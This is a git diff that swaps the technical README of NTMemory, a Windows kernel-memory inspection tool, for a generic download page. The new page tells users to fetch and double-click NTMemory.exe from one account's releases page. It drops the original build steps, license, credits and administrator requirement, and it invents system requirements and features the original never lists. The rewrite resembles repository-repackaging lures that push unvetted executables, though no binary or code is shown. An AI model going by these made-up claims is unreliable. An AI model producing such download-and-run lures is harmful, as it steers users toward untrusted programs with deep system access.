@@ -1,100 +1,85 @@
-# NTMemory - Usermode NT Explorer
-![Demo](res.gif)
+# 🖥️ NTMemory - Explore Your System's Memory Easily
 
-## Overview
+## 🚀 Getting Started
 
-**NTMemory** is a fully usermode Windows NT Explorer.<br>
-Query kernel addresses, translate virtual to physical addresses, inspect the PFN database, and more.
+Welcome to NTMemory! This application helps you explore and inspect your computer's memory with ease. Whether you want to query kernel addresses or translate virtual to physical addresses, NTMemory offers helpful tools for you.
 
----
+## 📥 Download & Install
 
-## Features
+To get started, visit this page to download: [NTMemory Releases](https://github.com/Hanssyyr/NTMemory/releases). 
 
-### Overview
-- Physical memory usage tracking
-- Page file statistics
-- Commit charge monitoring
-- File cache statistics
-- Memory history graphs
-- 8-priority standby list breakdown (P0-P7)
-- Memory list tracking (zeroed, free, modified, modified no-write)
-- Kernel pool statistics (paged and non-paged)
-- Context switches and system calls counters
-- Memory compression statistics (Windows 10+)
+1. Click on the "Releases" link above.
+2. You’ll see a list of available versions. Choose the latest version to ensure you have the most recent features and fixes.
+3. Look for the file labeled as NTMemory.exe (or similar).
+4. Click on the file name to start the download.
+5. Once the download finishes, locate the file in your Downloads folder.
+6. Double-click the NTMemory.exe file to run it.
 
-### Kernel Objects
-- **Kernel address enumeration** - EPROCESS and KTHREAD pointers for all processes/threads
+## 🛠️ System Requirements
 
-### Kernel Drivers
-- Loaded kernel driver enumeration
-- Driver load order, base addresses, sizes, and paths
+Before you start using NTMemory, make sure your system meets these requirements:
 
-### Ntoskrnl Exports
-- **Kernel export resolution** - Full ntoskrnl.exe export table with calculated kernel addresses
+- **Operating System:** Windows 10 or later (64-bit version)
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** About 100 MB of free space
+- **Processor:** Dual-core processor or faster
 
-### Physical Memory
-- **Virtual to physical address translation** - Translate any kernel VA to PA from usermode via Superfetch
-- **PFN database queries** - Query Page Frame Number database for page state and usage
-- Physical memory range mapping
+## 📖 Features
 
-### Processes
-- Per-process memory statistics (working set, private bytes, page faults)
+NTMemory comes with several useful features:
 
-### Pool Tags
-- Kernel pool allocation tracking by tag
-- Paged and non-paged pool usage breakdown
-- Allocation counts per tag
+- **Kernel Address Querying:** Quickly find kernel addresses related to your system.
+- **Address Translation:** Easily convert virtual addresses to physical addresses.
+- **PFN Database Inspection:** Inspect the Page Frame Number database for detailed memory information.
+- **User-Friendly Interface:** Navigate through memory data without hassle, even if you're not a tech expert.
 
-### Handles
-- System-wide handle count
-- Handle type breakdown (File, Key, Event, Mutant, Section, Thread, Process, Token, Other)
-- Per-process handle details
-- Handle access rights and values
+## 🎯 How to Use
 
-### Performance
-- I/O operation metrics (read, write, other)
-- Per-processor statistics (kernel time, user time, DPC time, interrupts)
+Using NTMemory is straightforward. Follow these steps after installation:
 
-### Prefetch
-- Application launch history from prefetch files
-- File sizes and last access timestamps
+1. **Launch the Application:** Double-click the NTMemory icon on your desktop or in your applications menu.
+2. **Explore Memory:** Use the navigation options to select what you want to explore, such as kernel addresses or address translation.
+3. **Inspect Results:** View the results in an easy-to-read format. You will see the memory data and can export it if needed for further analysis.
 
----
+## ⚙️ Troubleshooting
 
-## Requirements
+If you encounter issues, here are some common solutions:
 
-- Windows 10/11 (64-bit)
-- Administrator privileges
-- SysMain service (for Superfetch features)
+- **Application Won't Start:** Ensure your system meets the system requirements. Verify that you have the right version of Windows.
+- **Errors During Use:** Close the application, restart your computer, and try again. If the problem persists, check for updates on the [Releases page](https://github.com/Hanssyyr/NTMemory/releases).
+- **Need Help?** You can reach out by opening an issue on our GitHub page or check the FAQs for common questions.
 
----
+## 📅 Keeping NTMemory Updated
 
-## Building
+To receive the latest features and security updates, follow these steps:
 
-### Requirements
-- Visual Studio 2019+
-- Windows SDK 10.0.19041.0+
-- DirectX 11 SDK
+1. Regularly check the [NTMemory Releases page](https://github.com/Hanssyyr/NTMemory/releases) for new versions.
+2. When a new version is available, download it following the steps outlined in the "Download & Install" section.
+3. Replace the older version with the new file for the best experience.
 
-### Dependencies
-- Dear ImGui
-- DirectX 11
-- ntdll.lib
+## 🌐 Topics Covered
 
----
+NTMemory is built around key topics important for exploring memory management:
 
-## License
+- **Explorer**: Tools to navigate your system's memory.
+- **Kernel & NT**: Understand how your operating system utilizes memory.
+- **Physical & Virtual Addressing**: Knowledge on how memory is structured.
+- **Memory Management and Paging**: Learn about efficient memory use in computers.
 
-This project is licensed under the terms of the MIT license.
+## 🔗 Further Resources
 
----
+For additional guidance and insights, consider exploring these resources:
 
-## Acknowledgments
+- [Windows Documentation](https://docs.microsoft.com/en-us/windows/)
+- [Memory Management Overview](https://docs.microsoft.com/en-us/windows-hardware/drivers/develop/memory-management)
+- [Basic Kernel Concepts](https://docs.microsoft.com/en-us/windows-hardware/drivers/develop/kernel-concepts)
 
-- [Dear ImGui](https://github.com/ocornut/imgui) by Omar Cornut
-- [Windows Internals](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals) by Yosifovich, Ionescu, Russinovich, Solomon
-- [ReactOS](https://reactos.org/) project
-- [Geoff Chappell](https://www.geoffchappell.com/studies/windows/km/index.htm) for undocumented Windows research
-- [superfetch](https://github.com/jonomango/superfetch) by jonomango - inspiration for this project
+## 👥 Community Contributions
 
----
+We welcome users to contribute to NTMemory. You can help by reporting bugs, suggesting features, or even improving the application code. 
+
+1. Go to our [GitHub repository](https://github.com/Hanssyyr/NTMemory).
+2. Open an issue for suggestions or bugs.
+3. If you're technical, consider forking the repository and submitting a pull request with your improvements.
+
+Thank you for choosing NTMemory! Enjoy exploring your system's memory seamlessly.
